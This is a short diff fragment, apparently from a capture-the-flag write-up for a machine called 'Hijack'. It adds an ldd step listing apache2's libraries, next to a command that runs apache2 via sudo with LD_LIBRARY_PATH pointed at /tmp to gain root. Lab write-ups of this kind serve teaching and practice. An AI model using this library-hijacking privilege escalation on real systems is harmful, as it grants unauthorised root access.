@@ -241,6 +241,10 @@ rick@Hijack:~$
 to get the root
 https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
 
+to know which librairies apache2 use
+```bash
+ldd /usr/bin/apache2
+```
 
 ```bash
 rick@Hijack:/home/rick$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2                     
